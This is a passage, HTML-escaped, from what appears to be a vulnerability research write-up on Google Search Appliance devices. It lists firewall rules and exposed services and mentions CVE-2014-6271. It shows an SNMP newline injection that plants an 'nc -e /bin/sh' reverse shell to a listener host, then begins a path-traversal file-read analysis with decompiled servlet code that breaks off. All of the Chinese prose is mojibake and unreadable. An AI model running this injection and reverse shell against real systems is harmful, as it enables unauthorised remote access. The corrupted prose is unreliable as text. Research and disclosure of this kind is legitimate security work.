&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ•´ç†å‡ºä¾†å¯¦éš›å¯å­˜å–çš„TCP æ”»æ“Šé¢ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;é€šè¨ŠåŸ &lt;/th&gt;
      &lt;th&gt;æœå‹™åç¨±&lt;/th&gt;
      &lt;th&gt;ç¨‹å¼åŸ·è¡Œæª”æ‰€åœ¨ä½ç½®&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;è€Œæˆ‘å€‘ç™¼ç¾  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; ä¸­çš„å­—ä¸²å¯ä»¥ç”¨ä¾†è§£å¯†æ‰€æœ‰ install_bundle çš„å…§å®¹ï¼
ä½¿ç”¨ CVE-2014-6271 å–å¾—æ¬Šé™åŠ ä¸Šå¯ä»¥è§£å‡º install bundle ä¸­çš„å…§å®¹å¾Œï¼Œå° vGSA çš„ç ”ç©¶å°±æš«æ™‚å‘Šä¸€æ®µè½ï¼Œ
å…¶åŸ·è¡Œç’°å¢ƒä¸­è¨˜æ†¶é«”çš„ä¿è­·è¼ƒç‚ºç¼ºå°‘ï¼Œå¯èƒ½æœ‰æ©Ÿæœƒå­˜åœ¨å¼±é»ä¸¦åˆ©ç”¨ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;

&lt;p&gt;å®‰è£è¨­å‚™å¾Œå˜—è©¦æ›´æ”¹é–‹æ©Ÿé †åºï¼Œä½†ç™¼ç¾é€²å…¥BIOSéœ€è¦å¯†ç¢¼ï¼Œä¸”ç£ç¢Ÿä»‹é¢å¡çš„ç®¡ç†ä»‹é¢ä¸­ Dell H700 åƒ…æœ‰éƒ¨åˆ†åŠŸèƒ½å¯ä»¥æ“ä½œï¼š
&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—å˜—è©¦ç›´æ¥è®€å–ç¡¬ç¢Ÿå…§å®¹ï¼Œå¦‚æœç¡¬ç¢Ÿå…§å®¹æ²’æœ‰åŠ å¯†ï¼Œæœ‰æ©Ÿæœƒèƒ½ç›´æ¥å–å¾—è¨­å‚™ä½œæ¥­ç³»çµ±åŠè»Ÿé«”ã€‚
æˆ‘å€‘ç™¼ç¾å…¶ç¡¬ç¢Ÿä½¿ç”¨SAS ä»‹é¢é€²è¡Œå‚³è¼¸ï¼Œå˜—è©¦å‰é‚„éœ€è³¼è²·SAS å¡ï¼Œæœ¬æ¬¡æ¸¬è©¦ä½¿ç”¨LSI 9211-8i é€²è¡Œé€£çµï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€£æ¥å˜—è©¦è®€å–å¾Œç™¼ç¾åˆ°é€™æ˜¯ä¸€å€‹è‡ªæˆ‘åŠ å¯† SED ç£ç¢Ÿï¼Œéœ€è¦å¯†ç¢¼unlock æ‰èƒ½å­˜å–ï¼ŒOSSLab é€™é‚Šæœ‰æ›´è©³ç´°çš„è§£é‡‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (ä¸­æ–‡)&lt;/p&gt;

&lt;p&gt;åœ¨ç„¡æ³•ç›´æ¥å­˜å–ç¡¬ç¢Ÿçš„æƒ…æ³ä¸‹æœ‰å¹¾ç¨®æ–¹å¼å¯ä»¥ç¹¼çºŒå˜—è©¦ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å˜—è©¦è®€å‡ºæ–¼BIOS EEPROM ä¸­çš„å¯†ç¢¼ï¼Œä¸¦æ›´æ”¹é–‹æ©Ÿé †åº&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ­¤æ–¹å¼éœ€è¦ç ´å£ä¸»æ©Ÿæ¿ï¼Œæœ‰ä¸€å®šé¢¨éšªï¼Œæ–¼è»Ÿé«”å±¤æ‰¾ä¸åˆ°æ¼æ´æ‰æœƒä½¿ç”¨æ­¤ç¨®æ–¹å¼ã€‚
å¯åƒè€ƒé€™ç¯‡ç ”ç©¶ &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt; (è‹±æ–‡)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä½¿ç”¨ PCILeech è®€å–ã€å¯«å…¥è¨˜æ†¶é«”ä¸¦å–å¾—ç³»çµ±æ¬Šé™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ­¤æ–¹å¼éœ€è¦ç‰¹å®šPCI-e è¨­å‚™ï¼Œç•¶æ™‚é‚„æ²’æœ‰æº–å‚™æ­¤é¡è¨­å‚™ã€‚å¯ä»¥åƒè€ƒé€™å€‹ github å°ˆæ¡ˆï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å°‹æ‰¾å¯å­˜å–æœå‹™ä¹‹è»Ÿé«”æ¼æ´&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ­¤æ–¹å¼è¼ƒç‚ºç°¡å–®å¯è¡Œã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç®¡ç†ä»‹é¢æ›è¡Œå­—å…ƒæ’å…¥&quot;&gt;ç®¡ç†ä»‹é¢æ›è¡Œå­—å…ƒæ’å…¥&lt;/h4&gt;

&lt;p&gt;ç™»å…¥ç®¡ç†ä»‹é¢å¾Œï¼Œè§€å¯Ÿåˆ°å…¶ä¸­æœ‰ SNMP å–å¾—ç³»çµ±è³‡è¨Šçš„åŠŸèƒ½ï¼Œ
ä¸”æ­¤åŠŸèƒ½å¯ä»¥æ’å…¥è‡ªå®šç¾©å­—ä¸²ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šå˜—è©¦ç¶“å…¸çš„æ›è¡Œæ³¨å…¥ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å°‡ sysContact æ’å…¥&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ’å…¥ extend è¨­å®šå€¼ä¹‹å¾Œï¼Œå°±å¯ä»¥ç”¨ snmpwalk è§¸ç™¼ SNMP çš„extend åŠŸèƒ½ï¼Œ
ä¸¦åŸ·è¡Œ shellã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆåŠŸåŸ·è¡ŒæŒ‡ä»¤ä¸¦åé€£ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ä»»æ„è®€æª”&quot;&gt;ä»»æ„è®€æª”&lt;/h4&gt;

&lt;p&gt;æ–¼ GSA 6.x ç³»åˆ—ç‰ˆæœ¬å¾Œçš„ RPM å®‰è£åŒ…ä¸­ç™¼ç¾å…¶ 80/443 çš„ç¶²é æœå‹™ä½¿ç”¨ Apache httpdï¼Œ
å…¶ä¸­ä½æ–¼ /etc/httpd/conf.d/ ä¸­æœ‰è¨±å¤šçš„è¨­å®šã€‚
è€Œå…¶ä¸­ gsa-http.conf åŠ gsa-https.conf å¯ä»¥ç™¼ç¾æŸäº›ç›®éŒ„æœƒè¢«å°å‘è‡³æœ¬æ©Ÿç‰¹å®šçš„æœå‹™ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
  RewriteRule ^/dâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/(.*) http://localhost:7890/dps/dâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/$1 [P,L]
  RewriteRule ^/sâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/(.*) http://localhost:7890/dps/sâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/$1 [P,L]
  RewriteRule ^/vâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/(.*) http://localhost:7890/vâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/$1 [P,L]
  RewriteRule ^/$ http://localhost:7800/ [P,L]
  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­é€šè¨ŠåŸ ç‚º 7886 è·Ÿ 7890 çš„æœå‹™ç‚ºå¦å¤–åŸ·è¡Œçš„ Apache Tomcat ä¼ºæœå™¨ï¼Œç•¶ä¸²æ¥å…©å±¤ä»¥ä¸Šçš„ç¶²ç«™ä¼ºæœå™¨æ™‚ï¼Œ
Tomcat çš„è·¯å¾‘åˆ¤æ–· ..;/ æ˜¯ä¸€å€‹æœ‰è¶£çš„æ¸¬è©¦é»ï¼Œå¯ä»¥åƒé–±ä¸€ä½è€å‰è¼©çš„æ–‡ç« ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;è€Œæˆ‘å€‘æœ‰èˆˆè¶£çš„é»ç‚º dps ï¼Œé€™ä¼¼ä¹æ²’æœ‰åœ¨èˆŠç‰ˆçš„ GSA ä¸­çœ‹åˆ°ã€‚
å¾ dps.war ä¸­è§£å‡º /WEB-INF/web.xml è§€å¯Ÿç¶²é æ‡‰ç”¨é…ç½®ï¼Œä¸¦ç™¼ç¾ /font æœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ¥è‘—æŸ¥çœ‹ DPSDownloadServletï¼š&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç™¼ç¾æ­¤é¡åˆ¥æ˜¯ç¹¼æ‰¿è‡ª &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt;ï¼Œè·Ÿé€²æ­¤é¡åˆ¥ï¼š&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
